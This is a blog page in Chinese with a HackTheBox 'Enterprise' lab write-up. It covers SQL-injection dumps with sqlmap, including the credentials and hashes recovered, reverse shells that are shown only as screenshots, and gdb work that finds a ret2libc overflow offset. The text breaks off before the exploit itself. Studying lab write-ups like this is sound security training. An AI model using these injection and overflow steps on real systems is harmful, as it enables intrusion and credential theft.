@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>跟着靶机Writeup学BOF_Enterprise | 放荡不羁混世间 | B1ngDa0在这儿舞剑</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="靶机writeup,hackthebox">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","app_key":"pIKFHOkquTOmXNwhTKx9vBnu","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","appkey":"pIKFHOkquTOmXNwhTKx9vBnu","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/about" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">B1ngDa0</h5>
+          <a href="mailto:B1ngDa0@08sec.org" title="B1ngDa0@08sec.org" class="mail">
+            
+              <span>B</span>
+            
+              <span>1</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>D</span>
+            
+              <span>a</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>s</span>
+            
+              <span>e</span>
+            
+              <span>c</span>
+            
+              <span>.</span>
+            
+              <span>o</span>
+            
+              <span>r</span>
+            
+              <span>g</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/b1ngda0" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>跟着靶机Writeup学BOF_Enterprise</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">跟着靶机Writeup学BOF_Enterprise</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-08-11T05:31:32.000Z" itemprop="datePublished" class="page-time">
+  2019-08-11
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/跟着靶机writeup学BOF/">跟着靶机writeup学BOF</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-跟着靶机Writeup学BOF-Enterprise"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">跟着靶机Writeup学BOF_Enterprise</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-08-11 13:31:32" datetime="2019-08-11T05:31:32.000Z"  itemprop="datePublished">2019-08-11</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/跟着靶机writeup学BOF/">跟着靶机writeup学BOF</a></li></ul>
+
+
+
+            
+	<span id="/2019/08/11/跟着靶机Writeup学BOF-Enterprise/" class="leancloud_visitors" data-flag-title="跟着靶机Writeup学BOF_Enterprise" title="跟着靶机Writeup学BOF_Enterprise">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/08/11/跟着靶机Writeup学BOF-Enterprise/#comment">
+            <span class="valine-comment-count" data-xid="/2019/08/11/跟着靶机Writeup学BOF-Enterprise/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t01dbbec808509f6fb9.jpg" title="" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t01dbbec808509f6fb9.jpg" alt title class></a>
+                <p></p>
+            </figure>
+
+<blockquote>
+<p>Author：B1ngDa0</p>
+</blockquote>
+<blockquote>
+<p>Email：captainzhougai#foxmail.com</p>
+</blockquote>
+<p>&emsp;&emsp;今天给大家带来HTB(hackthebox)的靶机：Enterprise 的 writeup，作为 Exploit 编写教程的实例。如有什么问题或想加入Hackthebox的微信群，请联系我。</p>
+<p><a href="http://www.b1ngda0.cn/2019/08/11/%E8%B7%9F%E7%9D%80%E9%9D%B6%E6%9C%BAWriteup%E5%AD%A6BOF_Sneaky/">跟着靶机Writeup学BOF_Sneaky</a></p>
+<hr>
+<h2 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h2><p>Ret2LibC 攻击</p>
+<hr>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先 nmap 扫描获取端口信息</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p0.so.qhimgs1.com/t01bbe8c1d18d6fa00c.jpg" title="img" data-fancybox="images"><img src="http://p0.so.qhimgs1.com/t01bbe8c1d18d6fa00c.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p4.so.qhimgs1.com/t01a47e48d418ea89a7.jpg" title="img" data-fancybox="images"><img src="http://p4.so.qhimgs1.com/t01a47e48d418ea89a7.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>有三个 http 服务 一个一个看</p>
+<p>在 /etc/hosts 中将 10.10.10.61 绑定为 enterprise.htb</p>
+<p>80 端口：</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p3.so.qhimgs1.com/t01d02b407df35c9bf3.jpg" title="img" data-fancybox="images"><img src="http://p3.so.qhimgs1.com/t01d02b407df35c9bf3.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>WordPress 的博客</p>
+<p>通过访问 <a href="http://enterprise.htb/?author=1" target="_blank" rel="noopener">http://enterprise.htb/?author=1</a> 获得用户名</p>
+<p>willian.riker</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t01fc8942281b38450f.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t01fc8942281b38450f.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>未有其他信息</p>
+<p>查看 443 端口</p>
+<p>内容为 Apache 默认页面，爆破目录后获得 lcars.zip 文件</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t01278702bdf8bf3840.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t01278702bdf8bf3840.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t018940a64ff57295fc.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t018940a64ff57295fc.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>解压后获得 lcars_db.php lcars_dbpost.php lcars.php 三个文件</p>
+<p>依次查看内容</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t01ac15e35829dbc8fb.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t01ac15e35829dbc8fb.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t016177001c10b9a709.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t016177001c10b9a709.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t0147b6de56304a056b.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t0147b6de56304a056b.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>通过内容可以得知 wordpress 博客内的 lcars 插件可以被注入</p>
+<p>地址为：<a href="http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1" target="_blank" rel="noopener">http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1</a></p>
+<p>直接使用 sqlmap：</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t014498e0b8837ca5f0.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t014498e0b8837ca5f0.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&quot; --random-agent --batch --thread 10 -D wordpress -T wp_users -C &quot;user_login,user_pass&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t01634dcda214822031.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t01634dcda214822031.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>可以看到 用户 willian.riker，与我们之前获取的一致，但是密码跑不出来。</p>
+<p>在一篇未发表的博文中 发现了三个密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&quot; --random-agent --batch --thread 10 -D wordpress -T wp_posts -C post_content --dump</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t012bc5204d7f66ee0b.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t012bc5204d7f66ee0b.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>ZxJyhGem4k338S2Y</p>
+<p>ZD3YxfnSjezg67JZ </p>
+<p>u*Z14ru0p#ttj83zS6</p>
+<p>另外数据库中也存在 8080 端口的数据 一并 dump</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --threads 10 -D joomladb -T edz2g_users -C username --dump</span><br></pre></td></tr></table></figure>
+
+<p>最终汇总的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">DB:wordpress</span><br><span class="line"></span><br><span class="line">Table:wp_users</span><br><span class="line">user : william.riker</span><br><span class="line">pass : $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.</span><br><span class="line"></span><br><span class="line">Table:wp_posts</span><br><span class="line">未发表的一篇博文的内容：</span><br><span class="line"></span><br><span class="line">Needed somewhere to put some passwords quickly</span><br><span class="line">ZxJyhGem4k338S2Y </span><br><span class="line">enterprisencc170 </span><br><span class="line">ZD3YxfnSjezg67JZ </span><br><span class="line">u*Z14ru0p#ttj83zS6</span><br><span class="line"></span><br><span class="line">DB: joomladb </span><br><span class="line">prefix : edz2g</span><br><span class="line"></span><br><span class="line">Command : sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 -D joomladb -T edz2g_users -C username,password,email --dump --threads 10</span><br><span class="line">Table : edz2g_users</span><br><span class="line">+-----------------+--------------------------------------------------------------+--------------------------------+</span><br><span class="line">| username | password | email |</span><br><span class="line">+-----------------+--------------------------------------------------------------+--------------------------------+</span><br><span class="line">| geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge@enterprise.htb |</span><br><span class="line">| Guinan | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | guinan@enterprise.htb |</span><br><span class="line">+-----------------+--------------------------------------------------------------+--------------------------------+</span><br><span class="line"></span><br><span class="line">DB: mysql</span><br><span class="line">user: joomladb  |  2eb70fd4eb74f31283541aad4e83ab6e077bc0df MySQL4.1/MySQL5 : joomlapassword!</span><br><span class="line">user: root  | 95b8a7b0a041cf2011bea41db57315c603285253 MySQL4.1/MySQL5 : NCC-1701E</span><br></pre></td></tr></table></figure>
+
+<p>通过测试 william.riker：u*Z14ru0p#ttj83zS6，这对凭证成功进入 wordpress 后台</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t01419796b0ef5d12a1.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t01419796b0ef5d12a1.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>修改插件内容获得反弹shell</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p0.so.qhimgs1.com/t018e4b6682e0c8bcea.jpg" title="img" data-fancybox="images"><img src="http://p0.so.qhimgs1.com/t018e4b6682e0c8bcea.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t012e4f7a65e4404c85.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t012e4f7a65e4404c85.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>本以为到这儿，user 拿下。但是查看 user.txt ，发现我们在一个容器中。</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p0.so.qhimgs1.com/t01297e60940491d051.jpg" title="img" data-fancybox="images"><img src="http://p0.so.qhimgs1.com/t01297e60940491d051.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>于是转换方向，尝试在 8080 端口的 joolma 中 getshell</p>
+<p>使用前面 sqlmap 中的账号密码 成功登陆 joolma</p>
+<p>geordi.la.forge：ZD3YxfnSjezg67JZ </p>
+<p><a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t019d9070353a9e8e04.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t019d9070353a9e8e04.jpg" alt="img"></a></p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t01ed7602fc8f76742c.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t01ed7602fc8f76742c.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t011dded05fb778044b.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t011dded05fb778044b.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>通过 extplorer 修改文件内容 获取反弹 shell </p>
+<p><a rel=跟着靶机Writeup学BOF_Enterprise href="http://p3.so.qhimgs1.com/t0175d4a8dc8c1ac504.jpg" title="img" data-fancybox="images"><img src="http://p3.so.qhimgs1.com/t0175d4a8dc8c1ac504.jpg" alt="img"></a></p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t01db569acd592472a3.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t01db569acd592472a3.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>但是</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t014e1e6e26a13a58ae.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t014e1e6e26a13a58ae.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>我们依旧在容器里，没有真正拿到目标的 user 权限。</p>
+<h3 id="Get-User"><a href="#Get-User" class="headerlink" title="Get User"></a>Get User</h3><p>寻找一番，在 eXtplorer 中发现了我们之前下载的 lcars.zip</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t016d4e1722671ccc87.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t016d4e1722671ccc87.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>猜想这莫不是共享目录</p>
+<p>上传反弹 shell</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p0.so.qhimgs1.com/t01b9c271c8a8a70c96.jpg" title="img" data-fancybox="images"><img src="http://p0.so.qhimgs1.com/t01b9c271c8a8a70c96.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>尝试反弹</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t014f16708578a6aa84.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t014f16708578a6aa84.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>成功 get user。</p>
+<h3 id="Get-Root"><a href="#Get-Root" class="headerlink" title="Get Root"></a>Get Root</h3><p>依旧先枚举信息</p>
+<p>上 LinEnum</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p3.so.qhimgs1.com/t010a127a83eebdef40.jpg" title="img" data-fancybox="images"><img src="http://p3.so.qhimgs1.com/t010a127a83eebdef40.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>一些可能会用到的信息：</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t01f13d902cd4f7d7a6.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t01f13d902cd4f7d7a6.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p4.so.qhimgs1.com/t01e4786450a9a73d35.jpg" title="img" data-fancybox="images"><img src="http://p4.so.qhimgs1.com/t01e4786450a9a73d35.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p3.so.qhimgs1.com/t014ba928875a7261f7.jpg" title="img" data-fancybox="images"><img src="http://p3.so.qhimgs1.com/t014ba928875a7261f7.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t01e79d664cb56fc8fc.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t01e79d664cb56fc8fc.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>在 SUID 文件中找到一个可疑的二进制文件 执行之后：</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t01e4ad5e79285348ee.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t01e4ad5e79285348ee.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>需要验证代码才能继续，先放着。</p>
+<p>端口发现 32812 开启的，本地访问查看</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p4.so.qhimgs1.com/t01a50fcfe4f6ee532a.jpg" title="img" data-fancybox="images"><img src="http://p4.so.qhimgs1.com/t01a50fcfe4f6ee532a.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>与 /bin/lcars 文件一致</p>
+<p>lcars 和 32812 端口应该是提权关键了</p>
+<p>使用 ltrace 调试一下 /bin/lcars</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p4.so.qhimgs1.com/t016d2c8035a1f7a45c.jpg" title="img" data-fancybox="images"><img src="http://p4.so.qhimgs1.com/t016d2c8035a1f7a45c.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>获得验证代码：</p>
+<p>picarda1</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p2.so.qhimgs1.com/t01b78f3355ba246493.jpg" title="img" data-fancybox="images"><img src="http://p2.so.qhimgs1.com/t01b78f3355ba246493.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>可选择某个选项然后输入内容，有几个选项选择之后没反应，继续是菜单。</p>
+<p>经过测试，选项 4 中发现溢出</p>
+<p>输入 500个A 之后 连接直接断开，其他选项是无效字符，返回菜单。</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p5.so.qhimgs1.com/t01a74031bf949bf4ab.jpg" title="img" data-fancybox="images"><img src="http://p5.so.qhimgs1.com/t01a74031bf949bf4ab.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>查看 地址是否随机变化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -a --pattern &quot;randomize&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p4.so.qhimgs1.com/t01ddb686cc40ff9ef1.jpg" title="img" data-fancybox="images"><img src="http://p4.so.qhimgs1.com/t01ddb686cc40ff9ef1.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>地址随机变化 关闭着</p>
+<p>再使用 checksec 查看文件</p>
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p0.so.qhimgs1.com/t014002fb28c6fa4637.jpg" title="img" data-fancybox="images"><img src="http://p0.so.qhimgs1.com/t014002fb28c6fa4637.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>显示 PIE 是开启的（实际上通过命令 显示的是 AXLR 关闭的）</p>
+<p>下面将通过 Ret2LibC 的方式进行溢出攻击</p>
+<p>首先确定 EIP 大小</p>
+<p>这次将通过计算的方式，而非使用 MSF 的组件</p>
+<p>通过 gdb 分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb /bin/lcars</span><br></pre></td></tr></table></figure>
+
+<p>查看所有函数 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info functions</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p3.so.qhimgs1.com/t01d1cb4c6b879f05e0.jpg" title="img" data-fancybox="images"><img src="http://p3.so.qhimgs1.com/t01d1cb4c6b879f05e0.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p4.so.qhimgs1.com/t0165329c457127249e.jpg" title="img" data-fancybox="images"><img src="http://p4.so.qhimgs1.com/t0165329c457127249e.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>溢出测试的时候 写了是 disableForcefileds。</p>
+<p>所以让我们接着 反编译 disableForcefileds 函数</p>
+<p>还是先 更改为 inter 格式的汇编</p>
+<p>方便查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass disableForcefields</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=跟着靶机Writeup学BOF_Enterprise href="http://p1.so.qhimgs1.com/t016ee0f1ef50b4fcae.jpg" title="img" data-fancybox="images"><img src="http://p1.so.qhimgs1.com/t016ee0f1ef50b4fcae.jpg" alt="img" title class></a>
+                <p>img</p>
+            </figure>
+
+<p>现在我们可以通过此处的内容 计算 EIP 的大小了</p>
+<p>公式为 减去esp（sub esp）到添加esp（add esp）之间的大小的和（到调用__isoc99_scanf@plt为止）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">0x000007d8 &lt;+4&gt;:    sub    $0xd4,%esp</span><br><span class="line">...</span><br><span class="line">0x000007ee &lt;+26&gt;:    sub    $0xc,%esp</span><br><span class="line">...</span><br><span class="line">0x000007fd &lt;+41&gt;:    add    $0x10,%esp</span><br><span class="line">0x00000800 &lt;+44&gt;:    sub    $0xc,%esp</span><br><span class="line">...</span><br><span class="line">0x0000080f &lt;+59&gt;:    add    $0x10,%esp</span><br><span class="line">...</span><br><span class="line">0x0000081a &lt;+70&gt;:    sub    $0xc,%esp</span><br><span class="line">...</span><br><span class="line">0x00000823 &lt;+79&gt;:    add    $0x10,%esp</span><br><span class="line">0x00000826 &lt;+82&gt;:    sub    $0x8,%esp</span><br><span class="line">...</span><br><span class="line">因此：0xd4 + 0xc - 0x10 + 0xc - 0x10 + 0xc - 0x10 + 0x8 = 0xd0 = 208</span><br></pre></td></tr></table></figure>
+
+<p>所以 现在 需要覆盖的 EIP 的总大小为 </p>
+<p>208 + 4 = 212</p>
+<p>接下来需要查找到 system、exit、/bin/sh 的地址</p>
+<p>可通过 <a href="https://0xdeadbeef.info/code/libc-search.c" target="_blank" rel="noopener">libc-search 脚本</a></p>
+<hr>
